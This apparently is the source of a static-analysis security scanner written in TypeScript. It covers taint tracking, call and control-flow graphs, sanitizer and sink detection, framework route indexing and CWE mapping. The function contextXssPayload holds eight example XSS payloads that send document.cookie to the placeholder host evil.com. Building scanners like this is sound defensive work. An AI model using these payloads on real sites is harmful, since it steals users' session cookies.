// ─────────────────────────────────────────────────────────────────────────────
// SECURITY PIPELINE v4 — MULTI-STAGE DETERMINISTIC ENGINE
//
// Stage 1: Parse → AST-like line map
// Stage 2: Build Call Graph
// Stage 3: Build Control Flow Graph
// Stage 4: Interprocedural Taint Propagation (cross-function, async, promise chains)
// Stage 5: Trust Boundary Engine (formal source/sink/sanitizer classification)
// Stage 6: Contextual XSS Analysis (8 context types)
// Stage 7: SSRF Containment (DNS rebinding, IPv4/IPv6, decimal/octal normalization)
// Stage 8: Framework Semantics (Next.js, Express, NestJS, GraphQL, JWT, OAuth)
// Stage 9: Confidence Engine (exploitability, reachability, blast radius scoring)
// Stage 10: Attack Chain Builder (source→sanitizer→bypass→sink→escalation)
// ─────────────────────────────────────────────────────────────────────────────

export interface PipelineFinding {
  id:            string;
  title:         string;
  explanation:   string;
  exploitChain:  string;
  exploitPayload?: string;
  fix:           string | null;
  fixRejectionReason?: string;
  severity:      'high' | 'medium' | 'low';
  category:      string;
  line:          number | null;
  confidence:    number;       // 0–100: how certain the finding is real
  exploitability: number;     // 0–100: ease of exploitation
  reachability:  number;      // 0–100: how reachable from an external source
  blastRadius:   'critical' | 'high' | 'medium' | 'low';
  framework?:    string;       // which framework triggered this
  cwe?:          string;
  cweName?:      string;
  language?:     string;
  riskScore?:    number;
  ssaTrace?:     string[];
  pathCondition?: string[];
  sanitizerEvidence?: string | null;
  trustBoundary?: TrustBoundaryViolation;
  attackChain?:  AttackChain;
}

export interface TrustBoundaryViolation {
  source:    string;  // e.g. "req.body.username (untrusted)"
  sanitizer: string | null;
  bypass:    string | null;
  sink:      string;  // e.g. "db.query (privileged)"
}

export interface AttackChain {
  entry:     string;
  hops:      string[];
  sink:      string;
  impact:    string;
}

export interface PipelineReport {
  findings:         PipelineFinding[];
  callGraph:        CallGraph;
  cfg:              ControlFlowGraph;
  ssa:              SSAForm;
  projectIndex:     ProjectIndex;
  taintedVars:      Map<string, { line: number; source: string; hops: number }>;
  trustBoundaries:  TrustBoundary[];
  frameworkContext: FrameworkContext;
  precision:        PrecisionMetadata;
  summary:          string;
}

export interface PrecisionMetadata {
  files:             string[];
  objectFields:      number;
  constants:         number;
  deadLines:         number;
  feasibleBranches:  number;
  crossFileEdges:    number;
  routes:            number;
}

// ── Call Graph ────────────────────────────────────────────────────────────────
export interface CallNode { name: string; line: number; params: string[]; isAsync: boolean; file?: string }
export interface CallEdge { caller: string; callee: string; line: number; args: string[]; callerFile?: string; calleeFile?: string }
export interface CallGraph { nodes: Map<string, CallNode>; edges: CallEdge[] }

export interface ProjectSymbol {
  name: string;
  kind: 'function' | 'class' | 'route' | 'import' | 'export' | 'model' | 'auth';
  file: string;
  line: number;
  detail?: string;
}
export interface FrameworkRoute {
  framework: 'Flask' | 'Django' | 'FastAPI' | 'Express' | 'Next.js';
  method: string;
  path: string;
  handler: string;
  file: string;
  line: number;
  sensitive: boolean;
  authGuard: boolean;
  authEvidence?: string;
}
export interface ProjectIndex {
  files: string[];
  symbols: ProjectSymbol[];
  routes: FrameworkRoute[];
  imports: ProjectSymbol[];
  exports: ProjectSymbol[];
  crossFileEdges: CallEdge[];
}

export interface CFGNode {
  id: string;
  line: number;
  kind: 'entry' | 'statement' | 'branch' | 'sink' | 'return' | 'throw' | 'exit';
  code: string;
  functionName: string;
}
export interface CFGEdge {
  from: string;
  to: string;
  type: 'next' | 'true' | 'false' | 'call' | 'return' | 'exception';
  condition?: string;
}
export interface ControlFlowGraph {
  nodes: CFGNode[];
  edges: CFGEdge[];
  byLine: Map<number, CFGNode>;
}

export interface SSAVariable {
  name: string;
  version: number;
  ssaName: string;
  line: number;
  expression: string;
  sanitizedFor: SanitizerKind[];
  taintedFrom?: string;
}
export interface SSAForm {
  versions: Map<string, SSAVariable[]>;
  current: Map<string, string>;
  aliases: Map<string, string>;
}

type SanitizerKind = 'html' | 'url' | 'sql' | 'cmd' | 'path' | 'header' | 'schema' | 'type' | 'allowlist';
type SinkKind = 'sql' | 'xss' | 'cmd' | 'path' | 'redirect' | 'ssrf' | 'deserialization' | 'ssti' | 'eval' | 'header';

// ── Trust Boundary ────────────────────────────────────────────────────────────
export interface TrustBoundary {
  name:        string;
  trusted:     boolean;
  vars:        string[];
  sanitizers:  string[];
  description: string;
}

// ── Framework Context ─────────────────────────────────────────────────────────
export interface FrameworkContext {
  detected:    string[];
  nextjs:      boolean;
  express:     boolean;
  nestjs:      boolean;
  graphql:     boolean;
  prisma:      boolean;
  hasJwt:      boolean;
  hasOAuth:    boolean;
  hasWebSocket:boolean;
  serverActions: boolean;
  flask:       boolean;
  django:      boolean;
  fastapi:     boolean;
  pythonWeb:   boolean;
}

// ─── Sanitizer Registries ─────────────────────────────────────────────────────
const HTML_SANITIZERS     = /encodeHTML|escapeHtml|DOMPurify\.sanitize|validator\.escape|he\.encode|xss\(|sanitizeHtml/;
const URL_SANITIZERS      = /encodeURIComponent|new URL\s*\(|URL\.parse/;
const SQL_SANITIZERS      = /(?:escape|sanitize)Sql|mysql\.escape|psycopg2\.sql\.Identifier|bindparam|text\s*\([^)]*\)\.bindparams/i;
const SQL_PARAMETERIZED   = /(?:db|pool|client)\.(?:query|execute|run)\s*\([^)]*,\s*(?:\[|\{)|cursor\.execute\s*\([^,\n]+,\s*(?:\(|\[|\{)|\.filter\s*\(|\.where\s*\([^)]*(?:=|==)\s*\w+\s*\)|Prisma\.sql/i;
const CRLF_SANITIZERS     = /\.replace\s*\([\s\S]*?\\r\\n|\\.replace\s*\([\s\S]*?\\\\r|sanitize.*header/i;
const PATH_SAFE           = /path\.resolve\s*\([^)]*\)\s*[\s\S]{0,100}startsWith\s*\(|allowlist|ALLOWED_FILES/i;
const CMD_SAFE            = /spawn\s*\([^)]*,\s*\[[^\]]*\]\s*,?\s*(?:\{[^}]*shell\s*:\s*false[^}]*\})?\s*\)/;
const TIMING_SAFE         = /timingSafeEqual|safe-compare|slowEquals|crypto\.timingSafe/;
const REDIRECT_SAFE       = /ALLOWED_HOSTS|allowedDomains|allowlist|startsWith\s*\(['"]\/|startsWith\s*\(APP_URL/i;
const SCHEMA_SANITIZERS   = /\b(?:z|zod|Joi|yup|schema|validator)\b[\s\S]{0,80}\b(?:parse|safeParse|validate|is[A-Z]\w*)\s*\(|pydantic|BaseModel|Serializer\s*\(|forms\.Form|cleaned_data|full_clean\s*\(/i;
const PY_HTML_SANITIZERS  = /markupsafe\.escape|html\.escape|bleach\.clean|escape\s*\(/;
const PY_URL_SANITIZERS   = /urllib\.parse\.quote|url_has_allowed_host_and_scheme|is_safe_url/;
const PY_PATH_SANITIZERS  = /secure_filename|(?:Path|pathlib\.Path)\([^)]*\)\.resolve\s*\(|os\.path\.normpath|safe_join|send_from_directory/;
const PY_CMD_SAFE         = /subprocess\.\w+\s*\(\s*\[[^\]]+\][^)]*shell\s*=\s*False|subprocess\.\w+\s*\(\s*\[[^\]]+\](?![^)]*shell\s*=\s*True)/;

const CWE_BY_SINK: Record<SinkKind, { id: string; name: string }> = {
  sql:             { id: 'CWE-89', name: 'SQL Injection' },
  xss:             { id: 'CWE-79', name: 'Cross-site Scripting' },
  cmd:             { id: 'CWE-78', name: 'OS Command Injection' },
  path:            { id: 'CWE-22', name: 'Path Traversal' },
  redirect:        { id: 'CWE-601', name: 'Open Redirect' },
  ssrf:            { id: 'CWE-918', name: 'Server-Side Request Forgery' },
  deserialization: { id: 'CWE-502', name: 'Deserialization of Untrusted Data' },
  ssti:            { id: 'CWE-94', name: 'Code Injection' },
  eval:            { id: 'CWE-94', name: 'Code Injection' },
  header:          { id: 'CWE-113', name: 'HTTP Response Splitting' },
};

// ─── XSS Context Types ────────────────────────────────────────────────────────
type XssContext = 'html-body' | 'attribute' | 'js-string' | 'inline-js' | 'css' | 'url' | 'dom-sink' | 'jsx';

function detectXssContext(line: string, interp: string): XssContext {
  // Check what's around the interpolation
  if (/on\w+\s*=\s*["'][^"']*$/.test(line.slice(0, line.indexOf(interp)))) return 'attribute';
  if (/style\s*=\s*["'][^"']*$/.test(line.slice(0, line.indexOf(interp)))) return 'css';
  if (/href\s*=\s*["'][^"']*$/.test(line.slice(0, line.indexOf(interp)))) return 'url';
  if (/src\s*=\s*["'][^"']*$/.test(line.slice(0, line.indexOf(interp)))) return 'url';
  if (/\.innerHTML|\.outerHTML|document\.write|insertAdjacentHTML/.test(line)) return 'dom-sink';
  if (/dangerouslySetInnerHTML|__html/.test(line)) return 'jsx';
  if (/<script[\s>]/.test(line)) return 'inline-js';
  return 'html-body';
}

function contextXssPayload(ctx: XssContext): string {
  const payloads: Record<XssContext, string> = {
    'html-body':  '<script>fetch("//evil.com?c="+document.cookie)</script>',
    'attribute':  '" onmouseover="fetch(\'//evil.com?c=\'+document.cookie) x="',
    'js-string':  '";fetch("//evil.com?c="+document.cookie);//',
    'inline-js':  '</script><script>fetch("//evil.com?c="+document.cookie)</script>',
    'css':        'expression(fetch("//evil.com?c="+document.cookie))',
    'url':        'javascript:fetch("//evil.com?c="+document.cookie)',
    'dom-sink':   '<img src=x onerror=fetch("//evil.com?c="+document.cookie)>',
    'jsx':        '<img src=x onerror={fetch("//evil.com?c="+document.cookie)}>',
  };
  return payloads[ctx];
}

// ─── SSRF IP Normalization ─────────────────────────────────────────────────────
function isPrivateOrMetadataIP(urlStr: string): boolean {
  // Detect decimal IPs: 2130706433 = 127.0.0.1
  const decimalMatch = urlStr.match(/\b(0x[\da-f]+|\d{8,10})\b/i);
  if (decimalMatch) return true;
  // Detect octal: 0177.0.0.1 = 127.0.0.1
  if (/\b0\d+\.\d+\.\d+\.\d+/.test(urlStr)) return true;
  return false;
}

// ─── Stage 1: Parse Line Map ──────────────────────────────────────────────────
interface LineInfo {
  index:     number;   // 0-based
  raw:       string;
  trimmed:   string;
  isComment: boolean;
  isString:  boolean;
  indent:    number;
  file:      string;
}

function parseLines(code: string): LineInfo[] {
  const lines = code.split('\n');
  let currentFile = '<input>';
  return lines.map((raw, index) => {
    const trimmed   = raw.trim();
    const fileMarker = trimmed.match(/^(?:\/\/|#|--)?\s*(?:file|path|filename)\s*:\s*(.+)$/i) ??
      trimmed.match(/^[-=]{3,}\s*(.+?\.(?:js|jsx|ts|tsx|py|php|java|go|rb|cs))\s*[-=]{3,}$/i);
    if (fileMarker?.[1]) currentFile = fileMarker[1].trim();
    const isComment = trimmed.startsWith('//') || trimmed.startsWith('*') || trimmed.startsWith('/*');
    const isString  = /^['"`]/.test(trimmed);
    const indent    = raw.length - raw.trimStart().length;
    return { index, raw, trimmed, isComment, isString, indent, file: currentFile };
  });
}

function splitArgs(rawArgs: string): string[] {
  return rawArgs.split(',').map(s => s.trim().replace(/[=:].*/,'').trim()).filter(Boolean);
}

function cleanVarName(v: string): string {
  return v.trim().replace(/^\*\*?/, '').replace(/[=:].*/,'').replace(/\s+as\s+\w+$/,'').trim();
}

function varsFromDestructure(inner: string): string[] {
  return inner.split(',').map(cleanVarName).map(v => v.split(':').pop()?.trim() ?? v).filter(v => /^\w+$/.test(v));
}

function isSinkLine(raw: string): boolean {
  return /(?:db|pool|client)\.(?:query|execute|run)\s*\(|cursor\.execute\s*\(|\.innerHTML|dangerouslySetInnerHTML|document\.write|insertAdjacentHTML|(?:exec|execSync|spawn|spawnSync|os\.system|os\.popen|subprocess\.\w+)\s*\(|(?:readFile|createReadStream|open\s*\(|send_file|FileResponse|Path\.open)|redirect\s*\(|res\.redirect|fetch\s*\(|axios|pickle\.loads?|yaml\.load|eval\s*\(|exec\s*\(|Template\s*\(/.test(raw);
}

function detectSanitizers(expr: string): SanitizerKind[] {
  const out: SanitizerKind[] = [];
  if (HTML_SANITIZERS.test(expr) || PY_HTML_SANITIZERS.test(expr)) out.push('html');
  if (URL_SANITIZERS.test(expr) || PY_URL_SANITIZERS.test(expr)) out.push('url');
  if (SQL_SANITIZERS.test(expr) || SQL_PARAMETERIZED.test(expr)) out.push('sql');
  if (CMD_SAFE.test(expr) || PY_CMD_SAFE.test(expr)) out.push('cmd');
  if (PATH_SAFE.test(expr) || PY_PATH_SANITIZERS.test(expr)) out.push('path');
  if (CRLF_SANITIZERS.test(expr)) out.push('header');
  if (SCHEMA_SANITIZERS.test(expr)) out.push('schema');
  if (/parseInt|Number\s*\(|int\s*\(|float\s*\(|bool\s*\(/.test(expr)) out.push('type');
  if (/allowlist|whitelist|ALLOWED_|\.includes\s*\(|in\s+ALLOWED/i.test(expr)) out.push('allowlist');
  return [...new Set(out)];
}

function sanitizerCovers(sanitizers: SanitizerKind[], sink: SinkKind): boolean {
  if (sanitizers.includes('schema') || sanitizers.includes('allowlist')) return true;
  if (sink === 'sql') return sanitizers.includes('sql');
  if (sink === 'xss' || sink === 'ssti') return sanitizers.includes('html');
  if (sink === 'cmd' || sink === 'eval' || sink === 'deserialization') return sanitizers.includes('cmd');
  if (sink === 'path') return sanitizers.includes('path');
  if (sink === 'redirect' || sink === 'ssrf') return sanitizers.includes('url');
  if (sink === 'header') return sanitizers.includes('header');
  return false;
}

function detectLanguageLocal(code: string): string {
  if (/def\s+\w+\s*\(|from\s+(?:flask|django|fastapi)\b|import\s+(?:flask|django|fastapi)\b/.test(code)) return 'python';
  if (/<\?php|\$_(?:GET|POST|REQUEST)/.test(code)) return 'php';
  if (/public\s+class|import\s+java\./.test(code)) return 'java';
  if (/package\s+\w+|func\s+\w+\s*\(/.test(code)) return 'go';
  if (/:\s*(?:string|number|boolean)\b|interface\s+\w+/.test(code)) return 'typescript';
  return 'javascript';
}

function canonicalVar(expr: string): string {
  return expr.trim()
    .replace(/^await\s+/, '')
    .replace(/^\(?/, '')
    .replace(/\)?$/, '')
    .replace(/["'`]/g, '')
    .trim();
}

function isLiteralExpression(expr: string): boolean {
  return /^(?:['"`][\s\S]*['"`]|\d+(?:\.\d+)?|true|false|null|undefined|None|\[\s*\]|\{\s*\})$/.test(expr.trim());
}

function buildConstantFacts(lines: LineInfo[]): Map<string, { line: number; value: string }> {
  const constants = new Map<string, { line: number; value: string }>();
  for (const { index, raw, file } of lines) {
    const m = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*([^;]+)|^\s*(\w+)\s*=\s*([^#\n]+)/);
    if (!m) continue;
    const name = m[1] ?? m[3];
    const value = (m[2] ?? m[4] ?? '').trim();
    if (name && isLiteralExpression(value)) constants.set(name, { line: index + 1, value });
  }
  return constants;
}

function evalSimpleCondition(condition: string, constants: Map<string, { value: string }>): boolean | null {
  const trimmed = condition.trim();
  if (/^(?:false|False|0)$/.test(trimmed)) return false;
  if (/^(?:true|True|1)$/.test(trimmed)) return true;
  const eq = trimmed.match(/^(\w+)\s*([!=]==?)\s*(['"`]?[^'"`]+['"`]?)$/);
  if (!eq) return null;
  const known = constants.get(eq[1])?.value.replace(/^['"`]|['"`]$/g, '');
  const rhs = eq[3].replace(/^['"`]|['"`]$/g, '');
  if (known == null) return null;
  return eq[2].startsWith('!') ? known !== rhs : known === rhs;
}

function buildDeadLines(lines: LineInfo[], constants: Map<string, { value: string }>): Set<number> {
  const dead = new Set<number>();
  for (let i = 0; i < lines.length; i++) {
    const info = lines[i];
    const condition = (info.raw.match(/if\s*\(([^)]+)\)/) ?? info.raw.match(/if\s+(.+):/))?.[1];
    if (condition) {
      const feasible = evalSimpleCondition(condition, constants);
      if (feasible === false) {
        for (let j = i + 1; j < lines.length && lines[j].indent > info.indent; j++) dead.add(j + 1);
      }
    }

    if (/\b(return|throw)\b|^\s*raise\s+/.test(info.raw)) {
      for (let j = i + 1; j < lines.length && lines[j].indent > info.indent; j++) dead.add(j + 1);
    }
  }
  return dead;
}

function taintHas(tainted: Map<string, TaintVar>, expr: string): boolean {
  const v = canonicalVar(expr);
  if (tainted.has(v)) return true;
  const base = v.split('.')[0];
  return !!base && tainted.has(base);
}

function nearestSSA(name: string, line: number, ssa: SSAForm): SSAVariable | undefined {
  return (ssa.versions.get(name) ?? []).filter(v => v.line <= line).sort((a, b) => b.line - a.line)[0];
}

function nearestSSAInScope(name: string, line: number, scopeStart: number, ssa: SSAForm): SSAVariable | undefined {
  return (ssa.versions.get(name) ?? [])
    .filter(v => v.line <= line && v.line >= scopeStart)
    .sort((a, b) => b.line - a.line)[0];
}

function functionNameAt(line: number, callGraph: CallGraph): string {
  let best = '<module>';
  let bestLine = 0;
  for (const node of callGraph.nodes.values()) {
    if (node.line <= line && node.line > bestLine) {
      best = node.name;
      bestLine = node.line;
    }
  }
  return best;
}

function hasAuthGuardInWindow(lines: LineInfo[], routeIndex: number, handlerIndex: number): { guarded: boolean; evidence?: string } {
  const window = lines.slice(Math.max(0, routeIndex - 4), Math.min(lines.length, handlerIndex + 12)).map(l => l.raw).join('\n');
  const auth = window.match(/@(?:login_required|permission_required|jwt_required|require_auth)|Depends\s*\([^)]*(?:auth|token|current_user|require_user)|current_user\.is_authenticated|request\.user\.is_authenticated|require_auth|has_permission|is_authenticated|requireRole|adminOnly/i);
  return auth ? { guarded: true, evidence: auth[0] } : { guarded: false };
}

function isSensitiveRoutePath(path: string): boolean {
  return /(?:admin|delete|update|upload|config|debug|export|users?|billing|token|secret|settings|internal)/i.test(path);
}

function buildProjectIndex(lines: LineInfo[], callGraph: CallGraph): ProjectIndex {
  const symbols: ProjectSymbol[] = [];
  const imports: ProjectSymbol[] = [];
  const exports: ProjectSymbol[] = [];
  const routes: FrameworkRoute[] = [];

  for (const { index, raw, file } of lines) {
    const line = index + 1;
    const pyImport = raw.match(/^\s*(?:from\s+([\w.]+)\s+import\s+(.+)|import\s+([\w.]+))/);
    if (pyImport) {
      const imported = (pyImport[2] ?? pyImport[3] ?? pyImport[1] ?? '').split(',').map(s => cleanVarName(s)).filter(Boolean);
      for (const name of imported) imports.push({ name, kind: 'import', file, line, detail: pyImport[1] ?? pyImport[3] });
    }

    const jsImport = raw.match(/^\s*import\s+(?:\{([^}]+)\}|(\w+)|\*\s+as\s+(\w+)).*from\s+['"]([^'"]+)['"]/);
    if (jsImport) {
      const names = jsImport[1] ? jsImport[1].split(',').map(cleanVarName) : ([jsImport[2] ?? jsImport[3]].filter(Boolean) as string[]);
      for (const name of names) imports.push({ name, kind: 'import', file, line, detail: jsImport[4] });
    }

    const exportM = raw.match(/^\s*export\s+(?:async\s+)?(?:function|class|const|let|var)\s+(\w+)/);
    if (exportM) exports.push({ name: exportM[1], kind: 'export', file, line });

    const classM = raw.match(/^\s*class\s+(\w+)/);
    if (classM) symbols.push({ name: classM[1], kind: /models\.Model|db\.Model|BaseModel/.test(raw) ? 'model' : 'class', file, line });

    const routeM = raw.match(/@(?:app|router|bp)\.(route|get|post|put|patch|delete)\s*\(\s*['"]([^'"]+)['"]/);
    if (routeM) {
      const defLine = lines.slice(index + 1, index + 8).find(l => /^\s*(?:async\s+)?def\s+\w+\s*\(/.test(l.raw));
      const handler = defLine?.raw.match(/def\s+(\w+)\s*\(/)?.[1] ?? '<unknown>';
      const auth = hasAuthGuardInWindow(lines, index, defLine?.index ?? index);
      const framework = raw.includes('router.') && /FastAPI|APIRouter|from\s+fastapi/.test(lines.slice(0, index + 1).map(l => l.raw).join('\n')) ? 'FastAPI' : 'Flask';
      routes.push({
        framework,
        method: routeM[1] === 'route' ? 'ANY' : routeM[1].toUpperCase(),
        path: routeM[2],
        handler,
        file,
        line,
        sensitive: isSensitiveRoutePath(routeM[2]),
        authGuard: auth.guarded,
        authEvidence: auth.evidence,
      });
      symbols.push({ name: handler, kind: 'route', file, line, detail: routeM[2] });
    }

    if (/@(?:login_required|permission_required|jwt_required)|Depends\s*\([^)]*(?:auth|current_user)|require_auth|adminOnly|requireRole/i.test(raw)) {
      symbols.push({ name: functionNameAt(line, callGraph), kind: 'auth', file, line, detail: raw.trim() });
    }
  }

  for (const node of callGraph.nodes.values()) {
    symbols.push({ name: node.name, kind: 'function', file: node.file ?? '<input>', line: node.line });
  }

  const crossFileEdges = callGraph.edges.filter(e => e.callerFile && e.calleeFile && e.callerFile !== e.calleeFile);
  return {
    files: [...new Set(lines.map(l => l.file))],
    symbols,
    routes,
    imports,
    exports,
    crossFileEdges,
  };
}

function buildConstructorFieldSummaries(lines: LineInfo[]): Map<string, Array<{ param: string; field: string; index: number }>> {
  const summaries = new Map<string, Array<{ param: string; field: string; index: number }>>();
  for (let i = 0; i < lines.length; i++) {
    const cls = lines[i].raw.match(/^\s*class\s+(\w+)/);
    if (!cls) continue;
    const classIndent = lines[i].indent;
    for (let j = i + 1; j < lines.length && lines[j].indent > classIndent; j++) {
      const init = lines[j].raw.match(/^\s*def\s+__init__\s*\(([^)]*)\)\s*:/);
      if (!init) continue;
      const params = splitArgs(init[1]).filter(p => p !== 'self');
      const initIndent = lines[j].indent;
      for (let k = j + 1; k < lines.length && lines[k].indent > initIndent; k++) {
        const assign = lines[k].raw.match(/self\.(\w+)\s*=\s*(\w+)/);
        if (assign && params.includes(assign[2])) {
          const current = summaries.get(cls[1]) ?? [];
          current.push({ field: assign[1], param: assign[2], index: params.indexOf(assign[2]) });
          summaries.set(cls[1], current);
        }
      }
    }
  }
  return summaries;
}

// ─── Stage 2: Build Call Graph ────────────────────────────────────────────────
function buildCallGraph(lines: LineInfo[]): CallGraph {
  const nodes = new Map<string, CallNode>();
  const edges: CallEdge[] = [];

  // Pass 1: discover function definitions
  for (const { index, raw, file } of lines) {
    // function foo(...) / async function foo(...)
    let m = raw.match(/(?:export\s+)?(?:async\s+)?function\s+(\w+)\s*\(([^)]*)\)/);
    if (m) {
      const [, name, params] = m;
      nodes.set(name, {
        name, line: index + 1,
        params: splitArgs(params),
        isAsync: /async/.test(raw),
        file,
      });
      continue;
    }
    // const foo = (...) => / const foo = async (...) =>
    m = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?\(?([^)=]*)\)?\s*=>/);
    if (m) {
      const [, name, params] = m;
      nodes.set(name, {
        name, line: index + 1,
        params: splitArgs(params),
        isAsync: /async/.test(raw),
        file,
      });
      continue;
    }
    m = raw.match(/def\s+(\w+)\s*\(([^)]*)\)\s*:/);
    if (m) {
      const [, name, params] = m;
      nodes.set(name, {
        name,
        line: index + 1,
        params: splitArgs(params).filter(p => p !== 'self'),
        isAsync: /async\s+def/.test(raw),
        file,
      });
      continue;
    }
    m = raw.match(/^\s*class\s+(\w+)/);
    if (m) {
      nodes.set(m[1], {
        name: m[1],
        line: index + 1,
        params: [],
        isAsync: false,
        file,
      });
    }
  }

  // Pass 2: discover call edges
  for (const { index, raw, file } of lines) {
    const callRe = /(\w+)\s*\(([^)]*)\)/g;
    let cm: RegExpExecArray | null;
    while ((cm = callRe.exec(raw)) !== null) {
      const callee = cm[1];
      if (nodes.has(callee)) {
        // Determine caller by looking for the enclosing function (simplified)
        const caller = enclosingFunction(index + 1, nodes);
        const args   = cm[2].split(',').map(s => s.trim()).filter(Boolean);
        edges.push({ caller, callee, line: index + 1, args, callerFile: file, calleeFile: nodes.get(callee)?.file });
      }
    }
  }

  return { nodes, edges };
}

function enclosingFunction(line: number, nodes: Map<string, CallNode>): string {
  return [...nodes.values()]
    .filter(n => n.line <= line)
    .sort((a, b) => b.line - a.line)[0]?.name ?? '__global__';
}

function buildControlFlowGraph(lines: LineInfo[], callGraph: CallGraph): ControlFlowGraph {
  const nodes: CFGNode[] = [
    { id: 'entry', line: 0, kind: 'entry', code: '<entry>', functionName: '__global__' },
    { id: 'exit', line: lines.length + 1, kind: 'exit', code: '<exit>', functionName: '__global__' },
  ];
  const edges: CFGEdge[] = [];
  const byLine = new Map<number, CFGNode>();

  for (const info of lines) {
    if (!info.trimmed || info.isComment) continue;
    const line = info.index + 1;
    const kind: CFGNode['kind'] = /\bif\b|\belse\b|\bfor\b|\bwhile\b|\btry\b|\bexcept\b|\bcatch\b/.test(info.raw)
      ? 'branch'
      : /\breturn\b/.test(info.raw)
        ? 'return'
        : /\bthrow\b|raise\s+/.test(info.raw)
          ? 'throw'
          : isSinkLine(info.raw) ? 'sink' : 'statement';
    const node = { id: `L${line}`, line, kind, code: info.trimmed, functionName: enclosingFunction(line, callGraph.nodes) };
    nodes.push(node);
    byLine.set(line, node);
  }

  const executable = nodes.filter(n => n.line > 0 && n.line <= lines.length).sort((a, b) => a.line - b.line);
  if (executable[0]) edges.push({ from: 'entry', to: executable[0].id, type: 'next' });

  for (let i = 0; i < executable.length; i++) {
    const node = executable[i];
    const next = executable[i + 1];
    if (!next) {
      edges.push({ from: node.id, to: 'exit', type: node.kind === 'throw' ? 'exception' : 'next' });
      continue;
    }

    if (node.kind === 'return' || node.kind === 'throw') {
      edges.push({ from: node.id, to: 'exit', type: node.kind === 'throw' ? 'exception' : 'return' });
      continue;
    }

    if (node.kind === 'branch') {
      const cond = (node.code.match(/(?:if|while)\s*\(([^)]+)\)|if\s+(.+):/) ?? [])[1] ?? (node.code.match(/if\s+(.+):/) ?? [])[1];
      edges.push({ from: node.id, to: next.id, type: 'true', condition: cond?.trim() });
      const sameOrLower = executable.find(n => n.line > node.line && (lines[n.line - 1]?.indent ?? 0) <= (lines[node.line - 1]?.indent ?? 0));
      edges.push({ from: node.id, to: sameOrLower?.id ?? 'exit', type: 'false', condition: cond ? `!(${cond.trim()})` : undefined });
    } else {
      edges.push({ from: node.id, to: next.id, type: 'next' });
    }
  }

  for (const edge of callGraph.edges) {
    const from = byLine.get(edge.line);
    const callee = callGraph.nodes.get(edge.callee);
    if (from && callee) edges.push({ from: from.id, to: `L${callee.line}`, type: 'call', condition: `${edge.callee}(${edge.args.join(', ')})` });
  }

  return { nodes, edges, byLine };
}

function buildSSA(lines: LineInfo[]): SSAForm {
  const versions = new Map<string, SSAVariable[]>();
  const current = new Map<string, string>();
  const aliases = new Map<string, string>();
  const counters = new Map<string, number>();

  function define(name: string, line: number, expression: string) {
    const version = (counters.get(name) ?? 0) + 1;
    counters.set(name, version);
    const ssaName = `${name}_${version}`;
    const sanitizedFor = detectSanitizers(expression);
    const dep = [...current.keys()].find(v => new RegExp(`\\b${v}\\b`).test(expression));
    const item: SSAVariable = { name, version, ssaName, line, expression, sanitizedFor, taintedFrom: dep ? current.get(dep) : undefined };
    const list = versions.get(name) ?? [];
    list.push(item);
    versions.set(name, list);
    current.set(name, ssaName);
    if (/^\w+$/.test(expression.trim())) aliases.set(name, expression.trim());
  }

  for (const { index, raw } of lines) {
    const line = index + 1;
    const assign = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*(.+?);?\s*$|^\s*(\w+)\s*=\s*(.+?);?\s*$/);
    if (assign) define(assign[1] ?? assign[3], line, (assign[2] ?? assign[4] ?? '').trim());

    const destr = raw.match(/(?:const|let|var)\s*\{([^}]+)\}\s*=\s*(.+?);?\s*$/);
    if (destr) for (const v of varsFromDestructure(destr[1])) define(v, line, `${destr[2].trim()}.${v}`);

    const pyFor = raw.match(/for\s+(\w+)\s+in\s+(.+):/);
    if (pyFor) define(pyFor[1], line, pyFor[2].trim());
  }

  return { versions, current, aliases };
}

// ─── Stage 3: Detect Framework Context ───────────────────────────────────────
function detectFramework(code: string): FrameworkContext {
  const detected: string[] = [];
  const nextjs      = /from ['"]next\/|useRouter|useSearchParams|NextRequest|server action|'use server'/.test(code);
  const nestjs      = /@Controller|@Injectable|@Guard|@Module|@Get|@Post/.test(code);
  const graphql     = /GraphQLSchema|@Resolver|@Query|@Mutation|graphql`|typeDefs/.test(code);
  const flask       = /from\s+flask\s+import|Flask\s*\(|@app\.route|flask\.request|request\.(?:args|form|json|files|values|get_json)/.test(code);
  const django      = /from\s+django|django\.|urlpatterns|request\.(?:GET|POST|FILES|META)|JsonResponse|HttpResponseRedirect|from\s+django\.shortcuts\s+import\s+redirect|django\.shortcuts\.redirect\s*\(/.test(code);
  const fastapi     = /from\s+fastapi\s+import|FastAPI\s*\(|APIRouter\s*\(|@(?:app|router)\.(?:get|post|put|delete|patch)|Request\s*\)/.test(code);
  const express     = !fastapi && /express\(\)|Router\(\)|app\.(get|post|put|delete|use)\s*\(/.test(code);
  const prisma      = /PrismaClient|prisma\.\w+\.(findMany|findFirst|create|update|delete)/.test(code);
  const hasJwt      = /jwt\.(sign|verify|decode)|jsonwebtoken/.test(code);
  const hasOAuth    = /oauth|OAuth|redirect_uri|access_token|refresh_token/i.test(code);
  const hasWebSocket = /WebSocket|ws\.on|socket\.on|io\.on/.test(code);
  const serverActions = /'use server'|"use server"/.test(code);
  const pythonWeb   = flask || django || fastapi;

  if (nextjs) detected.push('Next.js');
  if (express) detected.push('Express');
  if (nestjs) detected.push('NestJS');
  if (graphql) detected.push('GraphQL');
  if (flask) detected.push('Flask');
  if (django) detected.push('Django');
  if (fastapi) detected.push('FastAPI');
  if (prisma) detected.push('Prisma');
  if (hasJwt) detected.push('JWT');
  if (hasOAuth) detected.push('OAuth');

  return { detected, nextjs, express, nestjs, graphql, prisma, hasJwt, hasOAuth, hasWebSocket, serverActions, flask, django, fastapi, pythonWeb };
}

// ─── Stage 4: Trust Boundary Engine ──────────────────────────────────────────
function buildTrustBoundaries(code: string): TrustBoundary[] {
  const boundaries: TrustBoundary[] = [];

  // Untrusted zone: external inputs
  const untrustedVars: string[] = [];
  const sources = code.matchAll(/(?:const|let|var)\s+(?:\{([^}]+)\}|(\w+))\s*=\s*(?:req\.|request\.|ctx\.|event\.)\s*(?:query|params|body|headers)/g);
  for (const m of sources) {
    if (m[1]) { // destructured
      untrustedVars.push(...m[1].split(',').map(s => s.trim().replace(/[=:].*/,'').trim()).filter(Boolean));
    } else if (m[2]) {
      untrustedVars.push(m[2]);
    }
  }
  // Also formData.get, searchParams.get
  const fpSources = code.matchAll(/(?:const|let|var)\s+(\w+)\s*=\s*(?:formData|searchParams)\.get\s*\(/g);
  for (const m of fpSources) untrustedVars.push(m[1]);
